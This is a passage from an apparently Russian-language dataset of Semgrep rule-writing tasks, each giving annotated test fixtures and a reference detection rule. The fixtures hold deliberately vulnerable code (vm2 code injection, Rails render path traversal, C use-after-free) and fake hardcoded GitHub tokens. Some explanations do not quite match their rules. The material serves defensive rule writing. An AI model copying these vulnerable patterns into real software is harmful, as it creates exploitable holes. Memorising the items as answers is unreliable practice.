также данные ресурса 'aws_iam_policy_document'. Оно ищет утверждения политики, содержащие действия, которые потенциально раскрывают доступ к ресурсам AWS ('Action'), и игнорирует те, где действие явно запрещено ('Effect = \"Deny\"'). Правило использует метапеременные ($TYPE и $ACTION) для обобщения различных типов ресурсов и действий.\n\n# Ключевые элементы:\n- ID: no-iam-resource-exposure\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "no-iam-resource-exposure",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: pyramid-authtkt-cookie-httponly-unsafe-default\nОписание уязвимости: Found a Pyramid Authentication Ticket cookie without the httponly option correctly set. Pyramid cookies should be handled securely by setting httponly=True. If this parameter is not properly set, your cookies are not properly protected and are at risk of being stolen by an attacker.\nCWE: CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: authtkt-cookie-httponly-unsafe-default.fixed.py\nfrom pyramid.authentication import AuthTktCookieHelper, AuthTktAuthenticationPolicy\n\n\n### True positives ###\n\n\ndef bad1():\n    # ruleid: pyramid-authtkt-cookie-httponly-unsafe-default\n    authtkt = AuthTktCookieHelper(secret=\"test\", httponly=True)\n\n\ndef bad3():\n    # ruleid: pyramid-authtkt-cookie-httponly-unsafe-default\n    authtkt = AuthTktAuthenticationPolicy(secret=\"test\", httponly=True)\n\n\n### True negatives ###\n\n\ndef good1():\n    # ok: pyramid-authtkt-cookie-httponly-unsafe-default\n    authtkt = AuthTktCookieHelper(secret=\"test\", httponly=True)\n\n\ndef good2(params):\n    # ok: pyramid-authtkt-cookie-httponly-unsafe-default\n    authtkt = AuthTktCookieHelper(**params)\n\n\ndef good3():\n    # ok: pyramid-authtkt-cookie-httponly-unsafe-default\n    authtkt = AuthTktAuthenticationPolicy(secret=\"test\", httponly=True)\n\n\ndef good4(params):\n    # ok: pyramid-authtkt-cookie-httponly-unsafe-default\n    authtkt = AuthTktAuthenticationPolicy(**params)\n\n\n// File: authtkt-cookie-httponly-unsafe-default.py\nfrom pyramid.authentication import AuthTktCookieHelper, AuthTktAuthenticationPolicy\n\n\n### True positives ###\n\n\ndef bad1():\n    # ruleid: pyramid-authtkt-cookie-httponly-unsafe-default\n    authtkt = AuthTktCookieHelper(secret=\"test\")\n\n\ndef bad3():\n    # ruleid: pyramid-authtkt-cookie-httponly-unsafe-default\n    authtkt = AuthTktAuthenticationPolicy(secret=\"test\")\n\n\n### True negatives ###\n\n\ndef good1():\n    # ok: pyramid-authtkt-cookie-httponly-unsafe-default\n    authtkt = AuthTktCookieHelper(secret=\"test\", httponly=True)\n\n\ndef good2(params):\n    # ok: pyramid-authtkt-cookie-httponly-unsafe-default\n    authtkt = AuthTktCookieHelper(**params)\n\n\ndef good3():\n    # ok: pyramid-authtkt-cookie-httponly-unsafe-default\n    authtkt = AuthTktAuthenticationPolicy(secret=\"test\", httponly=True)\n\n\ndef good4(params):\n    # ok: pyramid-authtkt-cookie-httponly-unsafe-default\n    authtkt = AuthTktAuthenticationPolicy(**params)  # Ограничиваем длину\n\nОпасные паттерны:\n• authtkt = AuthTktCookieHelper(secret=\"test\")\n• authtkt = AuthTktAuthenticationPolicy(secret=\"test\")\n\nБезопасные паттерны:  \n• authtkt = AuthTktCookieHelper(secret=\"test\", httponly=True)\n• authtkt = AuthTktAuthenticationPolicy(secret=\"test\", httponly=True)\n• authtkt = AuthTktCookieHelper(**params)\n\nЛегенда аннотаций:\n- // ruleid:pyramid-authtkt-cookie-httponly-unsafe-default: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:pyramid-authtkt-cookie-httponly-unsafe-default: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: pyramid-authtkt-cookie-httponly-unsafe-default\n  patterns:\n      - pattern: pyramid.authentication.$FUNC($...PARAMS)\n      - metavariable-pattern:\n          metavariable: $FUNC\n          pattern-either:\n            - pattern: AuthTktCookieHelper\n            - pattern: AuthTktAuthenticationPolicy\n      - pattern-not: pyramid.authentication.$FUNC(..., httponly=$HTTPONLY, ...)\n      - pattern-not: pyramid.authentication.$FUNC(..., **$PARAMS, ...)\n      - focus-metavariable: $...PARAMS\n  fix: |\n    $...PARAMS, httponly=True\n  message: >-\n    Found a Pyramid Authentication Ticket cookie without the httponly option correctly set. Pyramid\n    cookies should be handled securely by setting httponly=True.\n    If this parameter is not properly set, your cookies are not properly protected and\n    are at risk of being stolen by an attacker.\n  metadata:\n    cwe:\n    - \"CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag\"\n    owasp:\n    - A05:2021 - Security Misconfiguration\n    category: security\n    technology:\n    - pyramid\n    references:\n    - https://owasp.org/Top10/A05_2021-Security_Misconfiguration\n    subcategory:\n    - vuln\n    likelihood: LOW\n    impact: LOW\n    confidence: MEDIUM\n  languages: [python]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска вызовов функций AuthTktCookieHelper или AuthTktAuthenticationPolicy из модуля pyramid.authentication, где параметр httponly не установлен явно или через словарь параметров (**). Правило использует шаблонный подход для сопоставления функции и ее аргументов, проверяя отсутствие явного указания httponly=True и наличие только позиционных аргументов.\n\n# Ключевые элементы:\n- ID: pyramid-authtkt-cookie-httponly-unsafe-default\n- Язык: python \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "pyramid-authtkt-cookie-httponly-unsafe-default",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения check-render-local-file-include\nОписание уязвимости: Found request parameters in a call to `render`. This can allow end users to request arbitrary local files which may result in leaking sensitive information persisted on disk. Where possible, avoid letting users specify template paths for `render`. If you must allow user input, use an allow-list of known templates or normalize the user-supplied value with `File.basename(...)`.\nCWE: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\nТип анализа: taint\nЯзык: ruby\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле\nСпособы санитации: определены в правиле",
    "input": "Требования:\n- Язык: ruby\n- Тип анализа: taint\n- CWE: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: check-render-local-file-include.rb\n  def test_render\n    @some_variable = params[:unsafe_input]\n    # ok: check-render-local-file-include\n    render :index\n  end\n\n  def test_dynamic_render\n    page = params[:page]\n    #ruleid: check-render-local-file-include\n    render :file => \"/some/path/#{page}\"\n  end\n\n  def test_render_with_modern_param\n    page = params[:page]\n    #ruleid: check-render-local-file-include\n    render file: \"/some/path/#{page}\"\n  end\n\n  def test_render_with_modern_param\n    page = params[:page]\n    #ok: check-render-local-file-include\n    render file: File.basename(\"/some/path/#{page}\")\n  end\n\n  def test_render_with_modern_param_second_param\n    page = params[:page]\n    #ruleid: check-render-local-file-include\n    render status: 403, file: \"/some/path/#{page}\"\n  end\n\n  def test_render_with_old_param_second_param\n    page = params[:page]\n    #ruleid: check-render-local-file-include\n    render :status => 403, :file => \"/some/path/#{page}\"\n  end\n\n  def test_render_with_first_positional_argument\n    page = params[:page]\n    #ruleid: check-render-local-file-include\n    render page\n  end\n\n  def test_render_with_first_positional_argument_and_keyword\n    page = params[:page]\n    #ruleid: check-render-local-file-include\n    render page, status: 403\n  end\n\n  def test_param_ok\n    map = make_map\n    thing = map[params.id]\n    # ok: check-render-local-file-include\n    render :file => \"/some/path/#{thing}\"\n  end\n    \n\n\n  def test_render_static_template_name\n    # ok: check-render-local-file-include\n    render :update, locals: { username: params[:username] }\n  end  # Ограничиваем длину\n\nОпасные паттерны:\n• render :file => \"/some/path/#{page}\"\n• render file: \"/some/path/#{page}\"\n• render page\n\nБезопасные паттерны:  \n• render file: File.basename(\"/some/path/#{page}\")\n• render :update, locals: { username: params[:username] }\n\nЛегенда аннотаций:\n- // ruleid:check-render-local-file-include: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:check-render-local-file-include: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: check-render-local-file-include\n    mode: taint\n    pattern-sources:\n      - patterns:\n          - pattern: params[...]\n    pattern-sinks:\n      - patterns:\n          - pattern-either:\n              - pattern: |\n                  render ..., file: $X\n              - pattern: |\n                  render ..., inline: $X\n              - pattern: |\n                  render ..., template: $X\n              - pattern: |\n                  render ..., action: $X\n              - pattern: |\n                  render $X, ...\n          - focus-metavariable: $X\n    pattern-sanitizers:\n      - patterns:\n          - pattern: $MAP[...]\n          - metavariable-pattern:\n              metavariable: $MAP\n              patterns:\n                - pattern-not-regex: params\n      - pattern: File.basename(...)\n    message: Found request parameters in a call to `render`. This can allow end\n      users to request arbitrary local files which may result in leaking\n      sensitive information persisted on disk. Where possible, avoid letting\n      users specify template paths for `render`. If you must allow user input,\n      use an allow-list of known templates or normalize the user-supplied value\n      with `File.basename(...)`.\n    languages:\n      - ruby\n    severity: WARNING\n    metadata:\n      technology:\n        - ruby\n        - rails\n      category: security\n      cwe:\n        - \"CWE-22: Improper Limitation of a Pathname to a Restricted Directory\n          ('Path Traversal')\"\n      owasp:\n        - A05:2017 - Broken Access Control\n        - A01:2021 - Broken Access Control\n      source-rule-url: https://github.com/presidentbeef/brakeman/blob/main/lib/brakeman/checks/check_render.rb\n      references:\n        - https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion\n        - https://github.com/presidentbeef/brakeman/blob/f74cb53/test/apps/rails2/app/controllers/home_controller.rb#L48-L60\n      cwe2022-top25: true\n      cwe2021-top25: true\n      subcategory:\n        - vuln\n      likelihood: MEDIUM\n      impact: HIGH\n      confidence: MEDIUM\n      vulnerability_class:\n        - Path Traversal\n\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования метода 'render' в Ruby/Rails с передачей параметров, полученных от пользователя, напрямую в путь файла. Источниками (sources) являются параметры запроса, полученные через 'params'. Синками (sinks) являются различные способы вызова метода 'render', где путь к файлу передается непосредственно или косвенно через параметр. Правило также учитывает случаи, когда пользовательский ввод не проходит надлежащую санитаризацию, например, через функцию 'File.basename()'. Примеры опасного кода включают передачу неподсанкционированных параметров в метод 'render' без предварительной обработки, тогда как безопасный код демонстрирует правильное использование функции 'File.basename()' для нормализации пути.\n\n# Ключевые элементы:\n- ID: check-render-local-file-include\n- Язык: ruby \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "check-render-local-file-include",
      "language": "ruby",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Составь правило Semgrep для: github-fine-grained-pat\nОписание уязвимости: A gitleaks github-fine-grained-pat was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: INFO\n\nКонтекст кода:\n// File: github-fine-grained-pat.go\n// ruleid: github-fine-grained-pat\ngithub_api_token = \"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\"\ngithub_api_token = \"gho_gkp19cjcgv0b0akt2skq9qhk4bswzrzagerz\"\ngithub_api_token = \"ghu_d6iigas9ayzz1ru2nkemcf51uf7giekye10d\"\ngithub_api_token = \"ghs_wfnmo2sxr5b9e3m2tucw9zgs8msiwrt5dm3k\"\ngithub_api_token = \"ghr_oxjwkll093ocn52a6592ka7ofod5517bhmx9\"  # Ограничиваем длину\n\nОпасные паттерны:\n• // ruleid: github-fine-grained-pat\ngithub_api_token = \"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\"\n• // ruleid: github-fine-grained-pat\nvar myToken = \"gho_gkp19cjcgv0b0akt2skq9qhk4bswzrzagerz\";\n• // ruleid: github-fine-grained-pat\ngithub_access_token = \"ghu_d6iigas9ayzz1ru2nkemcf51uf7giekye10d\"\n\nБезопасные паттерны:  \n• github_api_token = os.Getenv(\"GITHUB_API_TOKEN\");\n• var token = securelyRetrievedFromVault();\n• const secretToken = getSecurelyFromHsm();\n\nЛегенда аннотаций:\n- // ruleid:github-fine-grained-pat: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:github-fine-grained-pat: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: github-fine-grained-pat\n  message: A gitleaks github-fine-grained-pat was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\n  languages:\n    - regex\n  severity: INFO\n  metadata:\n      likelihood: LOW\n      impact: MEDIUM\n      confidence: LOW\n      category: security\n      cwe:\n        - \"CWE-798: Use of Hard-coded Credentials\"\n      cwe2021-top25: true\n      cwe2022-top25: true\n      owasp:\n        - A07:2021 - Identification and Authentication Failures\n      references:\n        - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html\n      source-rule-url: https://github.com/zricethezav/gitleaks/tree/master/cmd/generate/config/rules\n      subcategory:\n        - vuln\n      technology:\n        - gitleaks\n  patterns:\n    - pattern-regex: github_pat_[0-9a-zA-Z_]{82}\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска жестко закодированных токенов API GitHub, начинающихся с 'github_pat_' и имеющих длину 82 символа. Такие токены представляют собой fine-grained personal access tokens (PAT), которые могут быть использованы для доступа к репозиториям и данным GitHub. Хранение таких токенов непосредственно в исходном коде является небезопасным, так как они могут быть случайно раскрыты или перехвачены злоумышленниками.\n\n# Ключевые элементы:\n- ID: github-fine-grained-pat\n- Язык: regex \n- Тип: vuln\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "github-fine-grained-pat",
      "language": "regex",
      "severity": "INFO",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения vm2-code-injection\nОписание уязвимости: Make sure that unverified user data can not reach `vm2`.\nCWE: CWE-94: Improper Control of Generation of Code ('Code Injection')\nТип анализа: search\nЯзык: javascript",
    "input": "Требования:\n- Язык: javascript\n- Тип анализа: search\n- CWE: CWE-94: Improper Control of Generation of Code ('Code Injection')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: vm2-code-injection.js\n'use strict';\n\nconst fs = require('fs');\nconst {VM, NodeVM} = require('vm2');\n\n\nasync function test1(code, input) {\n  code = `\n    console.log(${input})\n  `;\n\n  const sandbox = {\n    setTimeout,\n    fs: {\n      watch: fs.watch\n    }\n  };\n\n  // ruleid: vm2-code-injection\n  return new VM({\n    timeout: 40 * 1000,\n    sandbox\n  }).run(code);\n}\n\nfunction test2(input) {\n  const sandbox = {\n    setTimeout,\n    fs: {\n      watch: fs.watch\n    }\n  };\n\n  // ruleid: vm2-code-injection\n  const nodeVM = new NodeVM({timeout: 40 * 1000, sandbox});\n  return nodeVM.run('console.log(' + input + ')')\n}\n\nfunction test3(input) {\n  const sandbox = {\n    setTimeout,\n    fs: {\n      watch: fs.watch\n    }\n  };\n\n  const nodeVM = new NodeVM({timeout: 40 * 1000, sandbox});\n  // ruleid: vm2-code-injection\n  const script = new VMScript(`console.log(${input})`)\n  return nodeVM.run(script)\n}\n\nasync function okTest1(code) {\n  code = `\n    console.log(\"Hello world\")\n  `;\n\n  const sandbox = {\n    setTimeout,\n    fs: {\n      watch: fs.watch\n    }\n  };\n\n  return new VM({\n    timeout: 40 * 1000,\n    sandbox\n  }).run(code);\n}\n\nfunction okTest2() {\n  const sandbox = {\n    setTimeout,\n    fs: {\n      watch: fs.watch\n    }\n  };\n\n  const nodeVM = new NodeVM({timeout: 40 * 1000, sandbox});\n  return nodeVM.run('console.log(\"Hello world\")')\n}\n\nfunction okTest3() {\n  const sandbox = {\n    setTimeout,\n    fs: {\n      watch: fs.watch\n    }\n  };\n\n  const nodeVM = new NodeVM({timeout: 40 * 1000, sandbox});\n  const script = new VMScript('console.log(\"Hello world\")')\n  return nodeVM.run(script)\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• code = ``${input}``; ... return new VM(...).run(code);\n• nodeVM.run('console.log(' + input + ')');\n• script = new VMScript(`console.log(${input})`); ... nodeVM.run(script);\n\nБезопасные паттерны:  \n• code = `console.log(\"Hello world\")`; ... return new VM(...).run(code);\n• nodeVM.run('console.log(\"Hello world\")');\n• script = new VMScript('console.log(\"Hello world\")'); ... nodeVM.run(script);\n\nЛегенда аннотаций:\n- // ruleid:vm2-code-injection: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:vm2-code-injection: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: vm2-code-injection\n  message: >-\n    Make sure that unverified user data can not reach `vm2`.\n  metadata:\n    owasp:\n    - A03:2021 - Injection\n    cwe:\n    - \"CWE-94: Improper Control of Generation of Code ('Code Injection')\"\n    category: security\n    technology:\n    - vm2\n    cwe2022-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: HIGH\n    confidence: LOW\n    references:\n    - https://owasp.org/Top10/A03_2021-Injection\n  languages:\n  - javascript\n  - typescript\n  severity: WARNING\n  patterns:\n  - pattern-inside: |\n      require('vm2');\n      ...\n  - pattern-not-inside: |\n      $CODE = \"...\";\n      ...\n  - pattern-not-inside: |\n      require('vm2');\n      ...\n      $CODE = new VMScript(...);\n      ...\n  - pattern-either:\n    - pattern: |\n        $VM = new VM(...);\n        ...\n        $VM.run($CODE,...);\n    - pattern: |\n        new VM(...).run($CODE,...);\n    - pattern: |\n        $VM = new NodeVM(...);\n        ...\n        $VM.run($CODE,...);\n    - pattern: |\n        new NodeVM(...).run($CODE,...);\n    - pattern: |\n        new VMScript($CODE,...);\n  - pattern-not: |\n      $VM = new VM(...);\n      ...\n      $VM.run(\"...\",...);\n  - pattern-not: |\n      $VM = new NodeVM(...);\n      ...\n      $VM.run(\"...\",...);\n  - pattern-not: |\n      (new VM(...)).run(\"...\",...);\n  - pattern-not: |\n      (new NodeVM(...)).run(\"...\",...);\n  - pattern-not: |-\n      new VMScript(\"...\",...);\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования небезопасных методов выполнения пользовательского кода через библиотеку 'vm2' в JavaScript. Оно ищет случаи, когда пользовательский ввод напрямую включается в строку или выражение, которое затем передается функции run() объекта VM или NodeVM. Правило использует комбинацию шаблонов pattern-inside и pattern-not-inside для выявления включения пользовательского ввода в строковые литералы и исключения случаев, где ввод явно не используется таким образом. Шаблоны pattern-either проверяют различные способы вызова функций run(), а отрицательные шаблоны pattern-not исключают безопасные варианты, такие как передача жестко закодированных строковых литералов.\n\n# Ключевые элементы:\n- ID: vm2-code-injection\n- Язык: javascript \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "vm2-code-injection",
      "language": "javascript",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения use-timeout\nОписание уязвимости: Detected a 'requests' call without a timeout set. By default, 'requests' calls wait until the connection is closed. This means a 'requests' call without a timeout will hang the program if a response is never received. Consider setting a timeout for all 'requests'.\nCWE: \nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: use-timeout.py\nimport requests\n\nurl = \"www.github.com\"\n\n# ruleid: use-timeout\nr = requests.get(url)\n\n# ruleid: use-timeout\nr = requests.post(url)\n\n# ok: use-timeout\nr = requests.get(url, timeout=50)\n\n\ndef from_import_test1(url):\n    from requests import get, post\n\n    # ok: use-timeout\n    r = get(url, timeout=3)\n\n    # ruleid: use-timeout\n    r = post(url)\n\n\ndef test2():\n    \"\"\"Perform a requests.get and default headers set\"\"\"\n    headers = {**_get_default_headers(), **headers}\n    # ok: use-timeout\n    r = requests.get(\n        url, headers=headers, params=params, **{\"timeout\": TIMEOUT, **kwargs}\n    )\n    return r\n\n\ndef test3():\n    session = requests.Session()\n    # ruleid: use-timeout\n    r = session.get(get_url())\n\n    # ok: use-timeout\n    r = session.get(url, timeout=3)  # Ограничиваем длину\n\nОпасные паттерны:\n• r = requests.get(url)\n• r = requests.post(url)\n• session = requests.Session()\nr = session.get(get_url())\n\nБезопасные паттерны:  \n• r = requests.get(url, timeout=50)\n• from requests import get, post\nr = get(url, timeout=3)\n• session = requests.Session()\nr = session.get(url, timeout=3)\n\nЛегенда аннотаций:\n- // ruleid:use-timeout: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:use-timeout: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: use-timeout\n    pattern-either:\n      - patterns:\n        - pattern-not: requests.$W(..., timeout=$N, ...)\n        - pattern-not: requests.$W(..., **$KWARGS)\n        - pattern-either:\n            - pattern: requests.request(...)\n            - pattern: requests.get(...)\n            - pattern: requests.post(...)\n            - pattern: requests.put(...)\n            - pattern: requests.delete(...)\n            - pattern: requests.head(...)\n            - pattern: requests.patch(...)\n      - patterns:\n          - pattern-inside: |\n              $SESSION = requests.Session(...)\n              ...\n          - pattern-not: |\n              $SESSION.$W(..., timeout=$N, ...)\n          - pattern-not: |\n              $SESSION.$W(..., **$KWARGS)\n          - pattern-either:\n              - pattern: $SESSION.get(...)\n              - pattern: $SESSION.post(...)\n              - pattern: $SESSION.put(...)\n              - pattern: $SESSION.delete(...)\n              - pattern: $SESSION.head(...)\n              - pattern: $SESSION.patch(...)\n    fix-regex:\n      regex: (.*)\\)$\n      replacement: \\1, timeout=30)\n    message: >-\n      Detected a 'requests' call without a timeout set. By default, 'requests' calls\n      wait until the connection is closed. This means a 'requests' call without a timeout\n      will hang the program if a response is never received. Consider setting a timeout\n      for all 'requests'.\n    languages: [python]\n    severity: WARNING\n    metadata:\n      category: best-practice\n      references:\n        - https://docs.python-requests.org/en/latest/user/advanced/?highlight=timeout#timeouts\n        - https://requests.readthedocs.io/en/latest/user/quickstart/#timeouts\n      technology:\n        - requests\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска вызовов функции requests без установленного параметра timeout. Анализируются вызовы методов request, get, post, put, delete, head и patch. Также проверяются методы get и post, вызванные через объект Session. В случае использования объекта Session, необходимо убедиться, что параметр timeout присутствует во всех вызовах этих методов.\n\n# Ключевые элементы:\n- ID: use-timeout\n- Язык: python \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "use-timeout",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения aws-dynamodb-point-in-time-recovery-disabled\nОписание уязвимости: Point-in-time recovery is not enabled for the DynamoDB table. DynamoDB tables should be protected against accidental or malicious write/delete actions. By enabling point-in-time-recovery you can restore to a known point in the event of loss of data.\nCWE: CWE-221: Information Loss or Omission\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-221: Information Loss or Omission\n- Серьезность: INFO\n\nКонтекст кода:\n// File: aws-dynamodb-point-in-time-recovery-disabled.tf\n# ok: aws-dynamodb-point-in-time-recovery-disabled\nresource \"aws_dynamodb_table\" \"pass\" {\n  name     = \"example\"\n  hash_key = \"ExampleHashKey\"\n\n  attribute {\n    name = \"ExampleHashKey\"\n    type = \"S\"\n  }\n\n  point_in_time_recovery {\n    enabled = true\n  }\n}\n\n# ruleid: aws-dynamodb-point-in-time-recovery-disabled\nresource \"aws_dynamodb_table\" \"fail_1\" {\n  name     = \"example\"\n  hash_key = \"ExampleHashKey\"\n\n  attribute {\n    name = \"ExampleHashKey\"\n    type = \"S\"\n  }\n}\n\n# ruleid: aws-dynamodb-point-in-time-recovery-disabled\nresource \"aws_dynamodb_table\" \"fail_2\" {\n  name     = \"example\"\n  hash_key = \"ExampleHashKey\"\n\n  attribute {\n    name = \"ExampleHashKey\"\n    type = \"S\"\n  }\n\n  point_in_time_recovery {\n    enabled = false\n  }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"aws_dynamodb_table\" \"fail_1\" { ... }\n• resource \"aws_dynamodb_table\" \"fail_2\" { ... point_in_time_recovery { enabled = false } ... }\n\nБезопасные паттерны:  \n• resource \"aws_dynamodb_table\" \"pass\" { ... point_in_time_recovery { enabled = true } ... }\n\nЛегенда аннотаций:\n- // ruleid:aws-dynamodb-point-in-time-recovery-disabled: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:aws-dynamodb-point-in-time-recovery-disabled: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: aws-dynamodb-point-in-time-recovery-disabled\n  patterns:\n  - pattern: |\n      resource \"aws_dynamodb_table\" $ANYTHING {\n        ...\n      }\n  - pattern-not-inside: |\n      resource \"aws_dynamodb_table\" $ANYTHING {\n        ...\n        point_in_time_recovery {\n          ...\n          enabled = true\n          ...\n        }\n        ...\n      }\n  message: >- \n    Point-in-time recovery is not enabled for the DynamoDB table. DynamoDB\n    tables should be protected against accidental or malicious write/delete actions.\n    By enabling point-in-time-recovery you can restore to a known point in the event\n    of loss of data.\n  languages:\n  - hcl\n  severity: INFO\n  metadata:\n    category: security\n    technology:\n    - terraform\n    - aws\n    cwe:\n    - 'CWE-221: Information Loss or Omission'\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n    references:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/dynamodb_table#point_in_time_recovery\n    owasp: \n    - A09:2021 – Security Logging and Monitoring Failures\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов AWS DynamoDB таблиц, у которых не включена опция point-in-time recovery. Анализ выполняется путем поиска всех ресурсов DynamoDB таблиц ($pattern) и исключения случаев, когда внутри этих ресурсов явно указана включенная опция point-in-time recovery ($pattern-not-inside). Правило использует шаблон HCL (HashiCorp Configuration Language), тип анализа search и применимо только к Terraform конфигурациям.\n\n# Ключевые элементы:\n- ID: aws-dynamodb-point-in-time-recovery-disabled\n- Язык: hcl \n- Тип: audit\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "aws-dynamodb-point-in-time-recovery-disabled",
      "language": "hcl",
      "severity": "INFO",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: function-use-after-free\nОписание уязвимости: Variable '$VAR' was passed to a function after being freed. This can lead to undefined behavior.\nCWE: CWE-416: Use After Free\nТип анализа: search\nЯзык: c",
    "input": "Требования:\n- Язык: c\n- Тип анализа: search\n- CWE: CWE-416: Use After Free\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: function-use-after-free.c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\ntypedef struct name {\n    char *myname;\n    void (*func)(char *str);\n} NAME;\n\nvoid other_func(char *ignored) {}\nvoid refreencode(char *ignored) {}\n\nint bad_code1() {\n    NAME *var;\n    char buf[10];\n    var = (NAME *)malloc(sizeof(struct name));\n    free(var);\n    // ruleid: function-use-after-free\n    strcpy(buf, (char*)var);\n    // ruleid: function-use-after-free\n    other_func((char*)(*var));\n    // ruleid: function-use-after-free\n    other_func((char*)var[0]);\n    // ruleid: function-use-after-free\n    var->func(var->myname);\n    return 0;\n}\n\nint bad_code2() {\n    NAME *var;\n    char buf[10];\n    var = (NAME *)malloc(sizeof(struct name));\n    free(var);\n    // ruleid: function-use-after-free\n    strcpy(buf, (char*)*var);\n    // ruleid: function-use-after-free\n    other_func((char*)var);\n    // ruleid: function-use-after-free\n    other_func((char*)var->myname);\n    return 0;\n}\n\nint okay_code1() {\n    NAME *var;\n    var = (NAME *)malloc(sizeof(struct name));\n    free(var);\n    var = NULL;\n    // This will segmentation fault\n    // ok: function-use-after-free\n    other_func((char*)var);\n    other_func((char*)var->myname);\n    other_func((char*)*var);\n    return 0;\n}\n\nint okay_code2() {\n    NAME *var;\n    var = (NAME *)malloc(sizeof(struct name));\n    free(var);\n    var = NULL;\n    var = (NAME *)malloc(sizeof(struct name));\n    // This will segmentation fault\n    // ok: function-use-after-free\n    other_func((char*)var);\n    other_func((char*)var->myname);\n    other_func((char*)*var);\n    return 0;\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• free(var); // ruleid: function-use-after-free\nother_func((char*)var);\n• free(var);\nstrcpy(buf, (char*)var); // ruleid: function-use-after-free\n• free(var);\nvar->func(var->myname); // ruleid: function-use-after-free\n\nБезопасные паттерны:  \n• free(var);\nvar = NULL; // ok: function-use-after-free\nother_func((char*)var);\n• free(var);\nvar = (NAME *)malloc(sizeof(struct name)); // ok: function-use-after-free\nother_func((char*)var)\n• free(var);\nvar = NULL;\nother_func((char*)var); // This will segmentation fault but is considered safe\n\nЛегенда аннотаций:\n- // ruleid:function-use-after-free: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:function-use-after-free: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
